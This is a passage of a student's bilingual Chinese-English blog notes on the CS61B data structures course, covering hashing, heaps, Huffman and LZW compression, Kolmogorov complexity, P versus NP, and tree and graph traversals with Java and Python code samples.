arbitrary objects?<ol><li>Ans: in java, we use hashCode() for every objects，default hashCode()返回的是对象的地址</li></ol></li><li>Proble4: what if the <strong>hashCode is negative</strong>?<ol><li>Ans: Math.floorMod(x,y)可以取余负数</li></ol></li><li>HashTable(哈希表): 哈希表 “是一种存储信息的方式，其中有 M 个存储桶，分别存储 N 个项目。每个项目都有一个 “hashCode”，告诉你该把它放在 M 个桶中的哪个桶里</li><li>桶也会O(N)怎么办？– Load Factor<ol><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Hashing_LoadFactor.png" alt="Load Factor for runtime"></li><li>条件和运行时间<img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Hashing_Condition.png" alt="条件和运行时间"></li></ol></li><li>Java中的hashing注意点<img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Hashing_Java.png" alt="Java中的hashing注意点"><ol><li><p>演示的实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// recursive data structure</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">if</span> (<span class="built_in">this</span>.value == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">this</span>.hashCode() + <span class="number">31</span> * <span class="built_in">this</span>.left.hashCode() + <span class="number">31</span> * <span class="number">31</span> * <span class="built_in">this</span>.right.hashCode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// collection</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">int</span> <span class="variable">hashCode</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">   <span class="keyword">for</span> (Object o: <span class="built_in">this</span>) &#123;</span><br><span class="line">      hashCode = hashCode * <span class="number">31</span>;</span><br><span class="line">      hashCode += o.hashCode();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>A typical hash code base is a small prime.</p><ol><li>Why prime?o Never even:Avoids the overfow issue on previous slide.Lower chance of resulting hashCode having a bad relationship with theOnumber of buckets: See study guide problems and hw3.</li><li>Why small?o Lower cost to compute.</li></ol></li></ol></li></ol></li><li>More Details in dir &#x2F;CS106B&#x2F;Summary.md</li></ol><h3 id="5-5-Heaps-and-PQs"><a href="#5-5-Heaps-and-PQs" class="headerlink" title="5. 5 Heaps and PQs"></a>5. 5 Heaps and PQs</h3><ol><li><p>Problem: how to use Theta(M) space to filter the Theta(N) Information? – N &gt;&gt; M</p><ol><li>case: 流量监视</li></ol></li><li><p>ADTs: Priority Queue（优先队列）</p><ol><li>可以通过传入的比较器来决定是MinPQ还是MaxPQ</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">MinPQ</span>&lt;Item <span class="keyword">extends</span> <span class="title class_">Comparator</span>&lt;T&gt;&gt; &#123;</span><br><span class="line">   <span class="comment">/** Adds the item to the priority queue. */</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Item x)</span>;</span><br><span class="line">   <span class="comment">/** Returns the smallest item in the priority queue. */</span></span><br><span class="line">   <span class="keyword">public</span> Item <span class="title function_">getSmallest</span><span class="params">()</span>;</span><br><span class="line">   <span class="comment">/** Removes the smallest item from the priority queue. */</span></span><br><span class="line">   <span class="keyword">public</span> Item <span class="title function_">removeSmallest</span><span class="params">()</span>;</span><br><span class="line">   <span class="comment">/** Returns the size of the priority queue. */</span></span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ADTs: Heap(堆)</p><ol><li>Heap Properties<ol><li>Complete: 从左到右，紧密填满一层</li><li>Size: the parent is the max&#x2F;min of the tree (max-heap&#x2F;min-heap)</li></ol></li><li>Operations(cs106很熟悉了)<ol><li>add(Item x): 从底部添加，再与parent比较，可以的话交换</li><li>removeSmallest(): 最后一个item与顶端交换，再比较交换</li><li><a href="https://goo.gl/wBKdFQ">reference showcase</a></li><li>Runtime<img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Heap_Operation.png" alt="Runtime"></li></ol></li></ol></li><li><p>Data Structure: Tree Representation in Java – can be used to implement Heap</p><ol><li><p><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/TR_4.png" alt="四种"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// slibing presentation</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Tree1C</span>&lt;Key&gt; &#123;</span><br><span class="line">   Key k; <span class="comment">// e.g. 0</span></span><br><span class="line">   Tree1C favoredChild;</span><br><span class="line">   Tree1C sibling;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// boolean array</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Tree2</span>&lt;Key&gt; &#123;</span><br><span class="line">   Key[] keys;</span><br><span class="line">   <span class="type">int</span>[] parents;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>最适合heap的<img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/TR_ArraySentinel.png" alt="Array"></p><ol><li>0不要<img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/HeapArray1.png" alt="0不要"></li><li>0要<img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/HeapArray2.png" alt="0要"></li><li>对于数组*2的解释(0不要的)<ol><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/HeapIndex.jpg" alt="HeapIndex"></li><li>如果是0也一样的思路<strong>找一下规律再推广</strong></li></ol></li></ol></li></ol></li></ol><h3 id="5-6-Data-Structure-Summary"><a href="#5-6-Data-Structure-Summary" class="headerlink" title="5. 6 Data Structure Summary"></a>5. 6 Data Structure Summary</h3><ol><li>可重复的Sets和Maps没有涉及到</li><li>数据结构是关于数据的存储和搜索的</li><li>DataStructure Now Learned<ol><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/DataStructSummary.png" alt="DataStructure Now Learned"></li><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/DataStructSum2.png" alt="DataStructure Now Learned2"></li></ol></li></ol><h3 id="5-7-Compression-Originally-38"><a href="#5-7-Compression-Originally-38" class="headerlink" title="5. 7 Compression(Originally 38)"></a>5. 7 Compression(Originally 38)</h3><ol><li><p>压缩的核心</p><ol><li>使用不多于8位来表示，which codewords go with which symbols</li><li>Sequences with no existing redundancy or order may actually get enlarged – 可能会更大</li></ol></li><li><p>前缀码</p><ol><li>Problem1: 一连串的字符通过不加停止(无标志)，如何避免歧义 – Avoid ambiguity by making code prefix free<ol><li>Solution1: 可以使用01树来表示前缀码!!!</li></ol></li><li>Problem2: 不同文本的最佳前缀码是不同的<ol><li>Solution2: Huffman Coding<ol><li>Flow<img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Compression_Huffman.png" alt="flow"><ol><li><strong>make sure best</strong>：构建过程中”动态地”匹配出综合起来频率最低的进行加叶子，并会将频率进行叠加</li></ol></li><li>Huffman Coding Tree Property<ol><li>使用binary tree</li><li>由于前缀码的限制，只有叶子可以作为选择的内容</li></ol></li></ol></li></ol></li></ol></li><li><p>Huffman Coding Data Structure</p><ol><li>For encoding (bitstream to compressed bitstream) – array&#x2F;hashmap&lt;char,Bitsequence&gt;</li><li>For decoding: longest matching prefix – Tries ok</li></ol></li><li><p>现实世界中的huffman</p><ol><li><p>实现一(少): Build one corpus per input type. – result in suboptimal(次佳) encoding.</p></li><li><p>实现二(实际使用的方式): For every possible input file, create a unique code just for that file. Send the code along with the compressed file.</p><ol><li>安全性问题</li><li>独立存储编码表</li></ol></li><li><p>Work Flow</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// encoding</span></span><br><span class="line">Step <span class="number">1</span>: Count frequencies.</span><br><span class="line">Step <span class="number">2</span>: Build encoding array and decoding trie.</span><br><span class="line">Step <span class="number">3</span>: Write decoding trie to output.huf.</span><br><span class="line">Step <span class="number">4</span>: Write codeword <span class="keyword">for</span> each symbol to output.huf.</span><br><span class="line"></span><br><span class="line"><span class="comment">// decoding</span></span><br><span class="line">Step <span class="number">1</span>: Read in decoding trie.</span><br><span class="line">Step <span class="number">2</span>: Use codeword bits to walk down the trie, outputting symbols every time you reach a leaf. </span><br></pre></td></tr></table></figure></li></ol></li><li><p>其他压缩方式</p><ol><li>Run-length encoding: XXXXXXXXXYYYYXXXXX -&gt; X10Y4X5</li><li>LZW sytle compression</li><li>Lossy Compression</li></ol></li><li><p>Compression Model</p><ol><li>数学界限: 无法<strong>利用一个通用算法</strong>将一个文件压缩到50%，但是不通用可以达到这个效率<ol><li>反证一：可以递推至1个字节，显然无法辨别不同信息</li><li>反证二(鸽巢原理)：现有2^1000(1000字节)个可能，压缩为一半后最多有1+2+4+…+2^500  &#x3D; 2^501 - 1个可能性，无法容纳 – 长度也可以是信息</li></ol></li><li>为避免使用机器特殊的压缩算法比如if1则咋咋咋if0则咋咋咋，将算法源代码本身的位数包括在内</li><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Compression_2Models.png" alt="Two Model&#39;s"></li><li>model two compression example<ol><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Compression_Model2example.png" alt="model2"></li></ol></li></ol></li><li><p>LZW details(Extra)</p><ol><li><p><a href="https://docs.google.com/presentation/d/1U8XO6CWfcU4QgrFOZmGjAgmaKxLc8HXk6qB1JQVlqrg/">showcase</a></p></li><li><p>特点：使用新添加的codeword(ascii中没有)来表示symbols，但是在压缩和解压缩时无需传递新的表</p><ol><li>宏观：添加键是由规律可逆的，可以通过序列直接得出</li><li>细节(建议看完Encoding再回来)<ol><li>新添加的码也是一个一个进行添加的，但是只需要根据之前的码来，后依赖前，前不依赖后</li><li>每一次使用的键都是以前由出现过前缀才添加的，并且一开始只能由ascii码开始</li><li>综上decoding时也按照规律即可</li></ol></li></ol></li><li><p>Encoding</p><ol><li>Codewords for Multiple Symbols(一码对于多个char)</li><li>每一次添加Codeword都是为后续做准备，对于有多重复的内容具有较高的压缩能力</li><li><em><strong>新添加的Codeword</strong></em>: 当前最长前缀是否有codeword可以表示 -&gt; 没有: 添加当前最长前缀；有: 使用codeword表示，并添加新的最长前缀<ol><li>注意一点是前缀是慢慢累积上来的，要一个一个添加，不能一次性加很多个</li></ol></li></ol></li><li><p>Decoding – 没搞懂，有时间再看ppt</p><ol><li>flow<ol><li>也符合当前最长前缀和累计前缀的两个不变量</li><li>新表示一定可以找到对应的编码，可以通过归纳法来思考(但这并不是证明，会有特殊情况)<ol><li>简略：压缩时需要根据前缀进行匹配(一开始肯定不会有新编码)，而解压时会从当前已知前缀中找到对应编码</li><li>较详细：压缩时是通过当前最长匹配没有时添加已有的旧编码并添加新的编码(往自己+后看)，而解压缩时是直接找到对应编码后再添加新的编码(往自己+前看) – 二者在时序上还是有一点差别，有Special Case</li></ol></li></ol></li><li>Spacial Case – 会出现没有编码可用，but可以推断<ol><li>Why?<ol><li>looked ahead(向尾端看) one character to created new codewords.  When decompressing we look BACK to create new codewords</li><li><em><strong>Key Reason: 编码时往前看会预先得到下一个codeword，会有连续使用新编码的情况，depression时如果连续使用新编码的话只是添加先前的codeword，无法添加最新的codeword，但是可以推断</strong></em></li></ol></li><li>解决方法：设为未知数，假定已知来进行添加新编码(前一个+后一个第一个(其实就是前一个第一个))，改新编码就是对应位的编码</li></ol></li></ol>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> Start with ‘trivial’ codeword table </span><br><span class="line">where each codeword corresponds to one ASCII symbol.</span><br><span class="line"><span class="number">2.</span> When codeword X is encountered, </span><br><span class="line"><span class="keyword">return</span> appropriate symbols <span class="title function_">S</span><span class="params">(X)</span> given in codeword table.</span><br><span class="line"><span class="number">3.</span> Given consecutive codewords X1 and X2add codeword</span><br><span class="line">corresponding to [S(X1) + firstCharacterOf(S(X2))]</span><br><span class="line"><span class="comment">// 第三步是可以实时记录当前各个最长前缀吗</span></span><br><span class="line"><span class="comment">// firstChar是为了保持顺序而不跳步</span></span><br></pre></td></tr></table></figure></li></ol></li><li><p>Lossy Compression details(Extra)</p><ol><li>原ppt上的内容很少 – See EE20 (or perhaps 16A&#x2F;16B?) for more</li></ol></li></ol><h3 id="5-8-Compression-Complexity-and-P-NP"><a href="#5-8-Compression-Complexity-and-P-NP" class="headerlink" title="5. 8 Compression, Complexity, and P&#x3D;NP?"></a>5. 8 Compression, Complexity, and P&#x3D;NP?</h3><ol><li><p>柯尔莫戈洛夫复杂性 – Kolmogorov Complexity</p><ol><li>Definition: 是一种度量，它定义为生成一个特定对象（如比特流）的最短可能程序的长度(also: Kolmogorov复杂度是指生成某个字符串所需的最短计算机程序的长度)</li><li>Fact1: 这个定义与程序编写所用的具体编程语言无关。无论是Java、Python、C++还是其他任何语言，最短程序的长度在不同语言之间最多相差一个常数因子<ol><li>a completely random sequence of 1,000,000 bits has at best, a 1 in 2499999 chance of being compressed by 50%.</li></ol></li><li>Fact2: 不可能编写一个程序来计算任何比特流的柯尔莫哥洛夫复杂度<ol><li>推论：if we can’t even compute the length of the shortest program, it is also impossible to write the “perfect” compression algorithm – Optimal compression algorithm that works for all inputs does not exist! Leads to a logical fallacy</li></ol></li><li>Fact3: 理论上我们无法创建一种最佳压缩算法，将目标比特流 B 作为输入，并输出能输出该比特流的最短Java程序</li></ol></li><li><p>我们能创造一种有空间&#x2F;时间限制的压缩算法吗？可以！</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>P和NP(莫名高大上的东西) – 本质：计算复杂性理论中的两个重要问题类别</p><ol><li><p>P（多项式时间）</p><ol><li>高大上说法：类P包含所有可以在多项式时间内由确定性图灵机解决的<em><strong>决策问题</strong></em>（即答案是“是”或“否”的问题）。</li><li>平民说法：这意味着存在一个算法能够解决这个问题，并且其运行时间被输入大小的多项式函数所限制</li></ol></li><li><p>NP（非确定性多项式时间）</p><ol><li>高大上说法：类 NP 包含所有解答可以在多项式时间内由确定性图灵机验证的决策问题。或者说，NP 类问题可以在多项式时间内由非确定性图灵机解决</li><li>平民说法：在 NPNP 类问题中，如果给定一个“证书”或“见证”（一个假定的解答），可以在多项式时间内验证其正确性</li></ol></li><li><p>P &#x3D; NP? – 可验证 &#x3D;&#x3D; 可解答</p><blockquote><p>One reason to think yes:<br>Easy to check any given answer.<br>Maybe with the right pruning rules you can zero in on the answer?</p></blockquote></li></ol></li></ol><h2 id="6-Graphs"><a href="#6-Graphs" class="headerlink" title="6. Graphs"></a>6. Graphs</h2><h3 id="6-1-Tree-and-Graph-Traversals"><a href="#6-1-Tree-and-Graph-Traversals" class="headerlink" title="6. 1 Tree and Graph Traversals"></a>6. 1 Tree and Graph Traversals</h3><ol><li>树的遍历<ol><li><p>多种方式<img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Traversal_ways.png" alt="multiple ways"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. preOrder d b a c e f g</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">preOrder</span><span class="params">(BSTNode x)</span> &#123;</span><br><span class="line">   <span class="keyword">if</span> (x == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   print(x.value);</span><br><span class="line">   preOrder(x.left);</span><br><span class="line">   preOrder(x.right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. inOrder a b c d e f g</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">inOrder</span><span class="params">(BSTNode x)</span> &#123;</span><br><span class="line">   <span class="keyword">if</span> (x == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   inOrder(x.left);</span><br><span class="line">   print(x.value);</span><br><span class="line">   inOrder(x.right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. postOrder a c b e g f d</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">postOrder</span><span class="params">(BSTNode x)</span> &#123;</span><br><span class="line">   <span class="keyword">if</span> (x == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   postOrder(x.left);</span><br><span class="line">   postOrder(x.right);</span><br><span class="line">   print(x.value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 4. level order 层次遍历bfs</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TreeNode</span>:</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,val=<span class="number">0</span>,left=<span class="literal">None</span>,right=<span class="literal">None</span></span>):</span><br><span class="line">      <span class="variable language_">self</span>.val = val</span><br><span class="line">      <span class="variable language_">self</span>.left = left</span><br><span class="line">      <span class="variable language_">self</span>.right = right</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">levelOrder</span>(<span class="params">root</span>):</span><br><span class="line">   <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">      <span class="keyword">return</span> []</span><br><span class="line">   </span><br><span class="line">   res = []</span><br><span class="line">   queue = [root] <span class="comment"># bfs 常常使用 queue</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">while</span> queue:</span><br><span class="line">      current_level_size = <span class="built_in">len</span>(queue)</span><br><span class="line">      current_level_nodes = []</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(current_level_size):</span><br><span class="line">         node = queue.pop(<span class="number">0</span>)</span><br><span class="line">         current_level_nodes.append(node.val)</span><br><span class="line"></span><br><span class="line">         <span class="comment"># 左右节点进queue</span></span><br><span class="line">         <span class="keyword">if</span> node.left:</span><br><span class="line">            queue.append(node.left)</span><br><span class="line">         <span class="keyword">if</span> node.right:</span><br><span class="line">            queue.append(node.right)</span><br><span class="line">      </span><br><span class="line">      res.append(current_level_nodes)</span><br><span class="line">   <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>各自有用处</p><ol><li>Postorder Traversal for gathering file sizes.</li><li>前序遍历可以列出文件系统信息<code>ls</code></li></ol></li></ol></li><li>Simple Graph<ol><li><p>条件</p><ol><li>没有环loops</li><li>没有平行边parallel edges</li></ol></li><li><p>接下来都是默认的simple Graph</p></li><li><p>s-t Connectivity Problem – DFS</p><ol><li><a href="https://docs.google.com/presentation/d/1lTo8LZUGi3XQ1VlOmBUF9KkJTW_JWsw_DOPq8VBiI3A/edit#slide=id.g76e572688_0_185">reference showcase in google</a></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 伪代码</span></span><br><span class="line">Mark s</span><br><span class="line"><span class="title function_">if</span> <span class="params">(s == t)</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   any unmarked neighbor v of <span class="title function_">s</span> <span class="params">(<span class="keyword">for</span>?)</span>, </span><br><span class="line">   <span class="keyword">if</span> (connected(v, t)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Graph Traversal</p><ol><li><p>DFS preOrder: Action is before DFS calls to neighbors</p></li><li><p>DFS Postorder: Action is after DFS calls to neighbors.</p></li><li><p>BFS order (like tree level order)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dfs postOrder</span></span><br><span class="line">mark(s)</span><br><span class="line">For each unmarked neighbor n of s, dfs(n)</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line"><span class="comment">// dfs preOrder</span></span><br><span class="line">mark(s)</span><br><span class="line">print(s)</span><br><span class="line">For each unmarked neighbor n of s, dfs(n)</span><br></pre></td></tr></table></figure></li></ol></li></ol></li></ol><h3 id="6-2-Graph-Traversals-and-Implementations-BFS-and-DFS"><a href="#6-2-Graph-Traversals-and-Implementations-BFS-and-DFS" class="headerlink" title="6. 2 Graph Traversals and Implementations(BFS and DFS)"></a>6. 2 Graph Traversals and Implementations(BFS and DFS)</h3><ol><li><p>Shortest Path implemented with bfs</p><ol><li>not yet for weighted, 只适用于边长为1的</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 伪代码</span></span><br><span class="line">remove vertex v from fringe</span><br><span class="line">foreach unmarked neighbor n of v</span><br><span class="line">   mark n, add n to fringe</span><br><span class="line">   set edgeTo[n] = v, set distTo[n] = distTo[v] + <span class="number">1</span></span><br></pre></td></tr></table></figure></li><li><p>Graph API</p><ol><li>To Implement our graph algorithms, we need<ol><li>API</li><li>data structure</li></ol></li><li>Graph API Decision: 普灵斯顿版<ol><li><p>Common convention(惯例): 需要将节点进行适用int进行阐述，使用Map&lt;Label, Integer&gt;</p></li><li><p>Graph API from our optional textbook</p><ol><li>limitations<ol><li>Number of vertices must be specified in advance, Map&lt;Label, Integer&gt;</li><li>not weighted</li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Graph</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Graph</span><span class="params">(<span class="type">int</span> V)</span>; <span class="comment">// Create empty graph with v vertices</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addEdge</span><span class="params">(<span class="type">int</span> v, <span class="type">int</span> w)</span>;</span><br><span class="line">   Iterable&lt;Integer&gt; <span class="title function_">adj</span><span class="params">(<span class="type">int</span> v)</span>; <span class="comment">// vertices adjacent to v</span></span><br><span class="line">   <span class="type">int</span> <span class="title function_">V</span><span class="params">()</span>;</span><br><span class="line">   <span class="type">int</span> <span class="title function_">E</span><span class="params">()</span>; <span class="comment">// number of V / E</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">degree</span><span class="params">(Graph G, <span class="type">int</span> v)</span> &#123;</span><br><span class="line">      <span class="type">int</span> <span class="variable">degree</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> w: G.adj(v)) &#123;</span><br><span class="line">         degree += <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> degree;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">(Graph G)</span> &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">v</span> <span class="operator">=</span> <span class="number">0</span>; v &lt; G.V(); v += <span class="number">1</span>) &#123;</span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> w: G.adj(v)) &#123;</span><br><span class="line">            System.out.print(v);</span><br><span class="line">            System.out.print(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">            System.out.print(w);</span><br><span class="line">            <span class="comment">// 会有重复反向的出现</span></span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li></ol></li><li><p>Graph Representation and Graph Algorithm Runtime</p><ol><li>Representation表示<ol><li>Adjacency Matrix：无向图是对称矩阵<ol><li>G.adj(v)返回iterator可以使用next(), Theta(v) to iterate all neighbors, using hasNext() and next() – better than before theta(v^2)</li></ol></li><li>Edge Sets: 边的集合HashSet&lt;Edge&gt;</li><li>Adjacency list: Maintain array of lists indexed by vertex number – 数组+链表 <strong>最受欢迎的</strong><ol><li>完全图&#x2F;密度很高时print()时Worst为O(V^2)，密度比较小时是Theta(V)–2*V也是</li><li>all cases: Theta(V+E): Create V iterator, print E times per iterator</li><li>all cases和上述分类可以互相转换</li></ol></li><li>Runtime<img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Graph_Runtime.png" alt="Runtime"></li></ol></li></ol></li><li><p>Implementation</p><ol><li><p>bare-bones undirected graph implementation – Using Adjacency List</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 